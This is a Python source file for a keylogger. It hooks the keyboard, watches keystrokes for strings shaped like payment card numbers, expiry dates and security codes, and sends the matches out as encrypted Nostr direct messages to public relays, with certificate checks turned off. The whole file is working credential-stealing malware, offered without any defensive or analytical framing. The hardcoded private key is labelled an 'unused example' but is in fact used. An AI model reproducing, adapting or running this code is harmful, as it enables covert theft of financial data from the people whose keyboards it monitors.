import time
import ssl
import json
import pyxhook
from nostr.event import Event, EventKind
import nostr.key
from nostr.relay_manager import RelayManager
from nostr.message_type import ClientMessageType
from nostr.key import get_public_key

prikey = "d4a78905f4fb815fa31a3c651e9e7720b105443e7649e1833bb328e6a1c9b2de"  # unused example
pubkey = get_public_key(prikey)
relay_manager = RelayManager()
ss = nostr.key.compute_shared_secret(prikey, pubkey)
count = ""


def OnKeyPress(event):
    result = ""
    global count
    if len(event.Key) == 1:
        count += event.Key
    elif str(event.Key) == "BackSpace":
        count = count[:-1]
    if len(count) > 20:
        count = count[-21:]
        if count[-21:-6].isnumeric():
            if count[-6:-2].isalpha():
                if count[-2].isnumeric():
                    result += count[-21:-15] + " Ch " + count[-15:-10] + "-" + count[-10:-6] + " " + count[-6:-3] \
                              + " " + count[-3:-1]
            elif count[-6:-4].isalpha():
                if count[-4].isnumeric():
                    if count[-3].isnumeric():
                        if count[-2].isalpha():
                            if count[-1].isnumeric():
                                result += count[-21:-15] + " Ch " + count[-15:-10] + "-" + count[-10:-6] + " " + \
                                          count[-6:-2] + " " + count[-2:]
                    elif count[-3].isalpha():
                        if count[-2].isnumeric():
                            result += count[-21:-15] + " Ch " + count[-15:-10] + "-" + count[-10:-6] + " " + \
                                      count[-6:-3] + " " + count[-3:-1]
        if result is not None:
            if len(result) > 20:
                publish(result)


def nostr_connect():
    try:
        relay_manager.add_relay("wss://relay.damus.io")
        relay_manager.add_relay("wss://nostr-pub.wellorder.net")
        relay_manager.open_connections({"cert_reqs": ssl.CERT_NONE})
    except:
        pass


nostr_connect()


def publish(input):
    for tries in range(2):
        try:
            event = Event(pubkey, nostr.key.encrypt_message(input, ss), kind=4, tags=[["p", pubkey]])
            event.sign(prikey)
            message = json.dumps([ClientMessageType.EVENT, event.to_json_object()])
            relay_manager.publish_message(message)
            break
        except:
            nostr_connect()
            time.sleep(1.25)


# create a hook manager object
new_hook = pyxhook.HookManager()
new_hook.KeyDown = OnKeyPress
# set the hook
new_hook.HookKeyboard()
try:
    new_hook.start()  # start the hook
except KeyboardInterrupt:
    # User cancelled from command line.
    pass
except Exception as ex:
    # Write exceptions to the log file, for analysis later.
    msg = 'Error while catching events:\n {}'.format(ex)
    print(msg)
